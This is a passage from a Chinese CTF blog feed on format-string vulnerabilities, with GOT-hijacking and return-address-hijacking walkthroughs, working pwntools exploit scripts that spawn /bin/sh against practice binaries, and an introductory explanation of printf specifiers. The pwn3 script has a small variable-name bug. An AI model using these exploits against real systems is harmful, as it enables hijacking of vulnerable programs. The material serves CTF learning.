p.recv()<br>p.interactive()<br></code></pre></td></tr></table></figure><p>甚至本地复现都不用exp（x</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_exp.png"></p><p><del>(三个问号是因为我偷懒设置的本地flag和题目原本的flag长度不一样)</del></p><h1 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h1><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>当前ELF编译系统使用延迟绑定的技术来实现对共享库的调用过程，主要由GOT表和PLT表实现。</p><p>原理大致为 : 当目标模块存在一个外部共享库的函数调用时，在汇编层面使用 call 指令实现调用，其作用为跳转至对应函数的 PLT 表项处执行，该表项的第一条指令为 jmp *[ 对应 GOT 项的地址 ]，第一次执行函数调用时，通过 GOT 与 PLT 的合作，会将最终调用函数的地址确定下来，并存放在其对应的 GOT 表项中。当后续再发生调用时， jmp *[ 对应 GOT 项的地址 ] 指令即表示直接跳转至目标函数处执行。</p><p>在C程序中，libc函数都是通过GOT表跳转的。同时，如果程序没有开启RELRO保护，那么每个LIBC函数对应的GOT表项是可以被修改的。我们就可以借此修改某一个函数的GOT表地址为另一个函数，从而进行目标函数的调用。</p><p>假设我们需要将函数A的地址覆盖为函数B的地址，步骤为：</p><ul><li>确定 A 的 GOT 表地址</li><li>确定 B 的地址</li><li>将B的地址写入 A 对应的 GOT 表处</li></ul><h4 id="🌰：-1"><a href="#🌰：-1" class="headerlink" title="🌰："></a>🌰：</h4><p>题目在这里： <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">2016 CCTF 中的 pwn3</a> </p><h5 id="分析题目"><a href="#分析题目" class="headerlink" title="分析题目"></a>分析题目</h5><p>查看保护</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_checksec.png"></p><p>查看一下源码逻辑</p><p>首先在main函数中的 <code>ask_username() </code>函数中有一个 scanf 函数，并通过循环将输入值的ASCII码值加一赋值给 dest，也就是主函数中的s1。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_askname.png"></p><p>注意 <code>ask_password</code> 部分的判断条件，也就是我们最开始的输入要求是 <code>&quot;sysbdmin&quot;</code> 对应的每一字母的ASCII码值减一。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_askpassword.png"></p><p>可以在payload里写一个如下的函数： <del>（最后结果是 rxraclhm</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">password</span>():<br>    admin=<span class="hljs-string">&#x27;sysbdmin&#x27;</span><br>    name=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> admin:<br>        name+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>进入程序主循环后，查看每个函数的功能，三个函数对应模拟 FTP 的操作。没有地方可以栈溢出，要按照程序的逻辑一步一步进行。</p><p><code>put_file()</code> 函数：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_putfile.png"></p><p>由于 <code>file_head</code> 变量位于 BSS 段上，是全局变量。每次调用 <code>put_file()</code> 函数时，当前 <code>file_head</code> 存储的地址都是上一次分配的地址，赋值给 <code>v0[60]</code>，调用即将结束时会将本次的地址赋值给 <code>file_head</code> ，将会在下一次调用函数时赋值给对应的变量。如此就在栈上形成链表关系，可以通过遍历链表来访问之前保存的文件信息。</p><p><code>show_dir()</code> ：</p><p>读取 <code>put_file() </code>中形成的链表的内容也就是文件的名称并存储在 s 中，最后调用 <code>puts()</code> 输出 s。</p><p> <code>get_file()</code> 函数:</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_getfile.png"></p><p>有 <code>printf(dest)</code> 没有加格式化字符串，可以任意写和读。</p><p>需要注意的是我们不能控制程序跳转到 <code>get_file()</code> 再直接 get flag，<del>那样不高级</del> 程序设置检查输入“ flag ”会返回输出警告。</p><blockquote><p>做题原则：没有一个函数是多余的🤨</p></blockquote><h5 id="漏洞利用思路："><a href="#漏洞利用思路：" class="headerlink" title="漏洞利用思路："></a>漏洞利用思路：</h5><ul><li>绕过最开始的检查密码。</li><li>利用 <code>printf()</code> 获取 puts 的 GOT 地址，进而获得 system 函数的地址。</li><li>利用 <code>printf()</code> 修改 puts 的 GOT 表地址为 system 函数的地址。</li><li>将<code>show_dir()</code> 函数中 <code>puts()</code> 的参数也就是读取的文件信息改为” bin&#x2F;sh “。</li></ul><p>首先确定格式化字符串变量对应的偏移</p><p>找到 printf 的地址下断点用 gdb 调试一下，不要直接 <code>b printf</code>，那样会在每个 printf 都停一次，效率低低哒🤪<br><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_printf_addr.png"></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwn3_printf_stack.png"></p><p>可以看出是第七个参数。知道了参数的偏移就可以利用 printf 输出 put 的地址和修改 put 的 GOT 表地址啦。</p><p>在这里我们可以用到 pwntools 中的 fmtstr_payload 函数，函数返回一个完整的 payload。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fmtstr<span class="hljs-constructor">_payload(<span class="hljs-params">offset</span>, <span class="hljs-params">writes</span>, <span class="hljs-params">numbwritten</span>=0, <span class="hljs-params">write_size</span>=&#x27;<span class="hljs-params">byte</span>&#x27;)</span><br></code></pre></td></tr></table></figure><ul><li>offset：对应格式化字符串的偏移</li><li>writes：需要利用%n写入的数据，采用字典形式。比如我们要将 printf 的 GOT 数据改为 system 函数地址，就写成 <code>&#123;printfGOT: systemAddress&#125;</code></li><li>numbwritten：已经输出的字符个数，默认值为0，也可另附值</li><li>write_size：写入方式，分类有字节（byte）、双字节（short）和四字节（int），对应着 hhn、hn 和 n，默认值是byte。</li></ul><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br><br>sh=process(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn3&#x27;</span>)<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>admin=<span class="hljs-string">&#x27;sysbdmin&#x27;</span><br>name=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> admin:<br>name+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">1</span>)   <span class="hljs-comment">#绕过密码检查登，陆密码rxraclhm</span><br>sh.recvuntil(<span class="hljs-string">&#x27;Name (ftp.hacker.server:Rainism):&#x27;</span>)<br>sh.sendline(name)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;put&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;filename1&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;then, enter the content:&#x27;</span>)<br>show_puts_payload=p32(puts_got)+<span class="hljs-string">&#x27;%7$s&#x27;</span>     <span class="hljs-comment">#通过get泄露puts函数地址</span><br>sh.sendline(show_puts_payload)<br><br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;get&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;enter the file name you want to get:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;filename1&#x27;</span>)<br>puts_addr = u32(sh.recv()[:<span class="hljs-number">4</span>])   <span class="hljs-comment">#获得puts的实际地址</span><br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>system_offset = libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>puts_offset = libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = puts_addr - puts_offset + system_offset    <span class="hljs-comment">#获得system的实际地址</span><br><br>payload = fmtstr_payload(<span class="hljs-number">7</span>, &#123;puts_got: sys_addr&#125;)<br>sh.sendline(<span class="hljs-string">&#x27;put&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;please enter the name of the file you want to upload:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;then, enter the content:&#x27;</span>)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;ftp&gt;&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;get&#x27;</span>)    <span class="hljs-comment">#读取文件内容并执行printf进行地址覆盖</span><br>sh.recvuntil(<span class="hljs-string">&#x27;enter the file name you want to get:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh;&#x27;</span>)<br><br>sh.sendline(<span class="hljs-string">&#x27;dir&#x27;</span>)   <span class="hljs-comment">#调用puts读取文件名实际执行system(&#x27;bin/sh;&#x27;)</span><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h1><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p><p>🌰：</p><p> 题目在这里：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0">三个白帽 - pwnme_k0</a> </p><h5 id="分析题目-1"><a href="#分析题目-1" class="headerlink" title="分析题目"></a>分析题目</h5><p>检查保护：</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_checksec.png"></p><p>程序实现了一个登录的功能，可以查看和修改信息。玩了一下发现没有存储功能，修改了账号密码以后它就会覆盖新的数据，不会保留原来的数据。</p><p>看一下源码</p><p>把文件拖进ida就发现程序里留有后门函数，在 <code>sub_4008A6()</code> 函数中直接<code>return system(&quot;/bin/sh&quot;)</code>。我们可以控制程序跳转到这个地方。函数地址是 <code>0x4008AA</code></p><p>在 <code>sub_400B07</code> 函数，也就是主循环中对应的选项 <code>1.Sh0w Account Information</code> 中有 <code>printf()</code> 函数没有格式化字符串，似乎有漏洞可以利用。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_printf.png"></p><p>根据函数间变量的对应关系回溯一下程序其他的函数部分，发现在当初读入的时候就是以这个形式读入的（修改账号密码时读入也是这个形式）</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_input.png"></p><h5 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h5><ul><li><p>获取system执行时的地址</p></li><li><p>获取函数返回地址，利用 printf 修改返回地址为 system 后门函数地址</p></li><li><p>利用密码输入将payload写入</p></li></ul><p>首先确定一下偏移，断点下在第二个 printf 的地方。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/pwnme_stack.png"></p><p>可以看出输入的用户名在栈上的第三个位置，格式化字符串本身又在rdi上，所以偏移就是 6 + 3 - 1 &#x3D; 8。</p><p>同时栈上，第一个元素存储的是上一个函数的 rbp 也就是接下来所说的旧返回地址。栈上第二个位置存储的就是当前函数的返回地址，在格式化字符串中的偏移为 7，相对于旧返回地址的偏移为 0x7fffffffdd70 - 0x7fffffffdd38 &#x3D; 0x38。</p><p>返回地址 <code>0x400d74</code> 和目标地址 <code>0x4008AA</code>只有低字节不同，我们可以只修改低2字节 ，即：写成 <code>0x08AA = 2218</code>。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.arch=<span class="hljs-string">&quot;amd64&quot;</span><br><br>sh=process(<span class="hljs-string">&#x27;./pwnme_k0&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwnme_k0&#x27;</span>)<br><br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;modifier&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;%6$p&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>ret_addr = <span class="hljs-built_in">int</span>(sh.recvline().strip(),<span class="hljs-number">16</span>) - <span class="hljs-number">0x38</span><br><br>sh.recv()<br>sh.writeline(<span class="hljs-string">&quot;2&quot;</span>)<br>sh.recv()<br>sh.sendline(p64(ret_addr))<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;%2218d%8$hn&quot;</span>)<br>sh.recv()<br>sh.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>sh.recv()<br>sh.interactive()<br></code></pre></td></tr></table></figure><hr><p><strong>奇怪踩坑之我把chatGPT玩崩了</strong></p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/Snipaste_2023-07-11_22-10-00.png"></p><p>问题发生在我问了 chatGPT 一个弱智问题后，它说我输入了可疑信息。😨</p><p>最后我去找了机器人客服申诉，今天把我从小黑屋放出来了。</p><p>我做错了什么我就是笨笨而已为什么把我关小黑屋😿</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>格式化字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串</title>
    <link href="/2023/07/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2023/07/10/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<p>传说中的Format String 泄露任意地址和覆盖任意地址</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h3 id="格式化字符串函数"><a href="#格式化字符串函数" class="headerlink" title="格式化字符串函数"></a>格式化字符串函数</h3><p>格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式，格式化字符串函数可以接受可变数量的参数，并将其第一个参数作为格式化字符串函数。像是 <code>printf(&#39;My name is %s&#39;,&#39;Modifier&#39;)</code> ，<code>printf()</code> 就是格式化字符串函数。</p><h4 id="常见的格式化字符串函数"><a href="#常见的格式化字符串函数" class="headerlink" title="常见的格式化字符串函数"></a>常见的格式化字符串函数</h4><h5 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h5><ul><li>scanf</li></ul><h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><ul><li>printf    输出到stdout</li><li>fprintf    输出到FILE流</li><li>vprntf    根据参数列表格式化输出到stdout</li><li>vfprintf    根据参数列表格式化输出到指定 FILE 流</li><li>sprintf    输出到字符串</li><li>snprintf   输出指定字节数到字符串</li><li>vsprintf    根据参数列表格式化输出到字符串</li><li>vsnprintf    根据参数列表格式化输出指定字节到字符串</li><li>setproctitle    设置 argv</li><li>syslog    输出日志</li></ul><h4 id="格式化字符串的格式"><a href="#格式化字符串的格式" class="headerlink" title="格式化字符串的格式"></a>格式化字符串的格式</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">%<span class="hljs-selector-attr">[parameter]</span><span class="hljs-selector-attr">[flags]</span><span class="hljs-selector-attr">[field width]</span><span class="hljs-selector-attr">[.precision]</span><span class="hljs-selector-attr">[length]</span>type<br></code></pre></td></tr></table></figure><ul><li><strong>Parameter</strong> - 可省略</li></ul><p>表示为<code>n$</code>，这个格式说明符用于说明显示第几个参数。这使得同一个参数可以以不同的顺序被输出多次。需要注意的是，如果任意一个占位符使用了parameter，那么所有的占位符都必须使用parameter。</p><p>eg：<code>printf(&quot;%2$d ,%1$d&quot;,16,17)</code> 输出结果为<code>17，16</code></p><ul><li><strong>Flags</strong> - 可以为0或者多个</li></ul><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>+</td><td>仅用于数值类型。用于表示有符号数值的 <code>+</code> 或 <code>-</code> 号，缺省情况时省略正数的符号。</td></tr><tr><td>空格</td><td>作用于有符号数的输出，如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与’+’同时出现，则空格说明符被忽略。</td></tr><tr><td>-</td><td>左对齐。缺省情况是右对齐。</td></tr><tr><td>#</td><td>对于 <code>g</code> 与 <code>G</code> ，不删除尾部0以表示精度。对于 <code>f</code> , <code> F</code> ,  <code>e</code> ,  <code>E</code> ,  <code>g</code> ,  <code>G</code> , 总是输出小数点。对于 <code>o</code> ,  <code>x</code> ,  <code>X</code> , 在非0数值前分别输出前缀<code>0</code>, <code>0x</code>, and <code>0X</code>表示数制。</td></tr><tr><td>0</td><td>如果 width 选项前缀以0，则在左侧用0填充直至达到宽度要求。例如<code>printf(&quot;%2d&quot;, 3)</code>输出 <code> 3</code>，而<code>printf(&quot;%02d&quot;, 3)</code>输出 <code>03</code> 。如果<code>0</code>与<code>-</code>均出现，则<code>0</code>被忽略，即左对齐依然用空格填充。</td></tr></tbody></table><ul><li><strong>Field width</strong></li></ul><p>field width 即域宽，用于表示输出字符的最小宽度，常用于制表输出时填充固定宽度的表目。</p><p>如果实际输出内容宽度小于field width，则默认按照左对齐的标准进行填充；当实际输出内容宽度大于field width，不会截断而是原样输出。</p><p>如果域宽值为<code>*</code>，作为一个参数传递时则由对应的函数参数的值为当前域宽，例如 <code>printf(&quot;%*d&quot;,5,10)</code> ，参数<code>5</code>将传递给<code>*</code>作为这个输出的域宽。</p><p>需要注意，域宽没有负值且不能设置为0：前导的负值被解释为一个正数前导值和左对齐标志负号；前导0被解释为<code>flag</code>的0填充标志。</p><ul><li><strong>.Precision</strong></li></ul><p>Precision 是精度，在构造函数时不能忘记前缀 <code>.</code> 。precision 通常指输出的最大长度，其不同的含义依赖于具体的不同的格式化类型：</p><p>对于 <code>d</code>、<code>i</code>、<code>u</code>、<code>x</code>、<code>o</code> 的整型数值是指最小的数字位数，不足的位要在左侧补0，如果超过也不截断，缺省值为1。</p><p>对于 <code>a/A</code>、<code>e/E</code>、<code>f/F</code> 的浮点型数值，是指小数点后显示的位数，必要时四舍五入或补0，缺省值为6。</p><p>对于 <code>s</code> 的字符串类型，是指输出的字节的上限，超出限制的其它字符将被截断。</p><p>需要注意的是，如果设置为<code>*</code>，则由对应的函数参数的值为当前精度值。例如 <code>printf(&quot;%.*s&quot;,3,&quot;abcde&quot;)</code> 的输出为 <code>abc</code> 。</p><ul><li><strong>Length</strong> - 可省略</li></ul><p>length 指输出的浮点型或者整型参数的长度，也被称为size。</p><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>hh</td><td>表示函数期望接收一个 char 类型的参数，并会将它提升为 int 类型。</td></tr><tr><td>h</td><td>表示函数期望接收一个 short 类型的参数，并会将它提升为 int 类型。</td></tr><tr><td>ll</td><td>表示函数接收一个 long long 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>l</td><td>表示函数接收一个 long 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>L</td><td>表示函数接收一个 long double 类型的参数，并会把它转换为 double 类型。</td></tr><tr><td>j</td><td>表示函数接收一个 intmax_t (带符号的最大宽度整型，其范围在不同的系统上可能有所变化) 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>t</td><td>表示函数接收一个 ptrdiff_t () 类型的参数，并会把它转换为 int 类型。</td></tr><tr><td>z</td><td>表示函数接收一个 size_t 类型的参数，并会把它转换为 int 类型。</td></tr></tbody></table><ul><li><strong>type</strong></li></ul><p>type就是类型转换符，可以具体如下：</p><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>d&#x2F;i</td><td><code>signed int</code> 。在输出时，<code>d</code> 和 <code>i</code> 同义，但在输入时有所不同。 <code>%i</code> 在输入值有前缀 <code>0x</code> 时，将数据转换为16进制；在有前缀 <code>0</code> 时，将数据转换为8进制。</td></tr><tr><td>u</td><td>十进制 <code>unsigned int</code>。</td></tr><tr><td>f&#x2F;F</td><td>固定小数点表示法表示的<code>double</code>，小数点后的位数由精度字段控制。<code>f </code>和 <code>F</code> 在输出无限大和NAN时打印出的字符串不同，<code>f</code> 为 <code>inf</code> 、 <code>infinity</code> 和 <code>nan</code> ， <code>F</code> 为 <code>INF</code> 、 <code>INFINITY</code> 和 <code>NAN</code> 。</td></tr><tr><td>e&#x2F;E</td><td>以科学计数法表示的<code>double</code>，指数部分使用小写字母 <code>e</code> 或 <code>E</code> 引入。指数至少包含两个数字，如果值为零，则指数为00。例如，<code>1.2345e+03</code>表示1.2345乘10的3次方。</td></tr><tr><td>g&#x2F;G</td><td>按照具体情况在固定小数点表示法和科学计数法之间选择合适的double。</td></tr><tr><td>x&#x2F;X</td><td>以十六进制数形式输出的 <code>signed int</code> 。x使用小写字母，X使用大写字母。</td></tr><tr><td>o</td><td>以八进制形式输出的 <code>signed int </code>。</td></tr><tr><td>s</td><td>以空字符结尾的字符串。</td></tr><tr><td>c</td><td>char（字符）。</td></tr><tr><td>p</td><td>void*（指向void的指针）以特定于实现的格式输出。<code>printf(&quot;%p&quot;,a)</code> 用地址的格式打印变量 a 的值，<code>printf(&quot;%p&quot;, &amp;a)</code> 打印变量 a 所在的地址。</td></tr><tr><td>a&#x2F;A</td><td>以十六进制表示法输出的<code>double</code>，以0x或0X开头。a使用小写字母，A使用大写字母。</td></tr><tr><td>n</td><td>不输出任何内容，但将到目前为止已写入的字符数写入整数指针参数。</td></tr></tbody></table><h3 id="格式化字符串漏洞原理"><a href="#格式化字符串漏洞原理" class="headerlink" title="格式化字符串漏洞原理"></a>格式化字符串漏洞原理</h3><p>我们知道，x86是通过栈来传递函数的参数的，举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %x %s&quot;</span>,<span class="hljs-string">&quot;hello Modifier\n&quot;</span>, <span class="hljs-number">0xcafebabe</span>, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看其执行printf时的栈结构如下（这里编译成64位的了，所以在gdb不会在栈中显示格式化字符串本身）</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/printf-stack.png"></p><p>实际栈中的结构从高到低依次是<code>&#39;\n&#39;指针 --&gt; 0xcafebabe --&gt; &#39;hello Modifier\n&#39;指针--&gt;格式化字符串指针</code></p><p>看上去一切正常，那么我们如何触发格式化字符串漏洞呢？</p><p>根据 cdecl 的调用约定，在进入 <code>printf ()</code> 函数之前，将参数从右到左依次压栈。进入 <code>printf ()</code> 之后，函数首先获取第一个参数，一次读取一个字符。</p><ul><li>如果字符不是 %，字符直接复制到输出中。</li><li>字符是%，读取下一个字符。如果字符为空则报错，如果字符为%，输出%，除此之外，获取相应的参数并解析输出。</li></ul><p>总而言之，其实格式字符串漏洞发生的条件就是<strong>格式字符串要求的参数和实际提供的参数不匹配</strong>。</p><p>如下面的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %x %s %x %x %x&quot;</span>,<span class="hljs-string">&quot;hello Modifier&quot;</span>, <span class="hljs-number">0xcafebabe</span>, <span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行就会输出栈上的高地址</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/bug-printf-1.png"></p><p>同样，如果我们把函数写成这个样子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序照样会运行，但输出如下图</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/bug-printf-2.png"></p><p>其中第一个%s，程序将其解析为其地址对应的字符串，如果我们提供一个不存在的地址，程序就会崩溃。</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>就像在格式化字符串原理部分说的，格式化字符串的两个利用手段就是;</p><ul><li>利用%s 对应的参数地址不合法让程序崩溃。</li><li>根据 %d，%f 输出了栈上的内容，查看栈上的内容。</li></ul><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" 